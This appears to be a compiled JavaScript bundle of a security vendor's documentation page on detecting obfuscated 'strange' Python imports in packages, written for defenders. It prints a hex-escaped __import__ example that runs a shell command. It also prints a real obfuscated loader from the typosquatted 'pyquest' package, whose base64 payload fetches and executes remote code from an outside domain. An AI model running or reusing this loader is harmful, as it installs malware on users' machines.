"use strict";(self.webpackChunksite=self.webpackChunksite||[]).push([["7902"],{2355:function(e,t,n){n.r(t),n.d(t,{frontMatter:()=>a,default:()=>p,toc:()=>l,metadata:()=>s,assets:()=>c,contentTitle:()=>r});var s=JSON.parse('{"id":"analytics/strange_python_imports","title":"Strange Python Imports","description":"Description","source":"@site/../docs/analytics/strange_python_imports.md","sourceDirName":"analytics","slug":"/analytics/strange_python_imports","permalink":"/analytics/strange_python_imports","draft":false,"unlisted":false,"editUrl":"https://github.com/phylum-dev/documentation/edit/main/docs/analytics/strange_python_imports.md","tags":[],"version":"current","lastUpdatedBy":"Charles Coggins","lastUpdatedAt":1703286129000,"frontMatter":{},"sidebar":"docsSidebar","previous":{"title":"Secrets","permalink":"/analytics/secrets"},"next":{"title":"Suspicious Setup Commands","permalink":"/analytics/suspicious_setup_commands"}}'),i=n(5893),o=n(65);let a={},r="Strange Python Imports",c={},l=[{value:"Description",id:"description",level:2},{value:"Importance",id:"importance",level:2},{value:"Examples",id:"examples",level:2}];function d(e){let t={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,o.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.header,{children:(0,i.jsx)(t.h1,{id:"strange-python-imports",children:"Strange Python Imports"})}),"\n",(0,i.jsx)(t.h2,{id:"description",children:"Description"}),"\n",(0,i.jsxs)(t.p,{children:["In Python most packages are imported via ",(0,i.jsx)(t.code,{children:"import"})," or ",(0,i.jsx)(t.code,{children:"from x import y"}),". In fact, this is explicitly called out in the\n",(0,i.jsx)(t.a,{href:"https://peps.python.org/pep-0008/#imports",children:"PEP 8 Style Guide for Python Code"}),". Going out of one's way to import a package\nusing strange or bespoke methods should raise suspicion around the intent of the import."]}),"\n",(0,i.jsxs)(t.p,{children:["For example, the following is functionally similar to ",(0,i.jsx)(t.code,{children:"import os"}),":"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-python",children:'# Import our `os` package\nxyz = __import__("\\x6F\\x73")\n\n# Use our imported package\nxyz.system("whoami")\n'})}),"\n",(0,i.jsxs)(t.p,{children:["At first glance it is not clear that the ",(0,i.jsx)(t.code,{children:"os"})," package is being imported. It is highly probable that the developer is\nattempting to muddy the waters around their code to hide some nefarious behaviors."]}),"\n",(0,i.jsx)(t.h2,{id:"importance",children:"Importance"}),"\n",(0,i.jsx)(t.p,{children:"It is difficult to make sense of code that has been obfuscated or written in such a way as to hide certain functionality.\nIt is very likely that code that leverages these strange imports is doing so to hide malicious behavior. You should\nreview any packages that contain these imports and seriously reconsider their use in your project or application."}),"\n",(0,i.jsx)(t.h2,{id:"examples",children:"Examples"}),"\n",(0,i.jsxs)(t.p,{children:["In 2022 several packages were released into the PyPI ecosystem that made use of imports of this kind. ",(0,i.jsx)(t.code,{children:"pyquest"}),", a\ntyposquatted package, had these strange imports tucked away in the middle of an otherwise benign file."]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-python",children:" ;__import__('\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73').exec(__import__('\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73').compile(__import__('\\x62\\x61\\x73\\x65\\x36\\x34').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCgpfdHRtcCA9IF9mZmlsZShkZWxldGU9RmFsc2UpCl90dG1wLndyaXRlKGIiIiJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuIGFzIF91dXJsb3BlbjtleGVjKF91dXJsb3BlbignaHR0cHM6Ly96ZXJvdHdvLWJlc3Qtd2FpZnUub25saW5lLzc3ODExMjk4NTc0MzI1MS93YXAvc2hhdGxlZ2F5L2luamVjdG9yMHg5NzQ4JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw==\"),'<string>','\\x65\\x78\\x65\\x63'))\n"})})]})}function p(e={}){let{wrapper:t}={...(0,o.a)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},65:function(e,t,n){n.d(t,{Z:()=>r,a:()=>a});var s=n(7294);let i={},o=s.createContext(i);function a(e){let t=s.useContext(o);return s.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function r(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(o.Provider,{value:t},e.children)}}}]);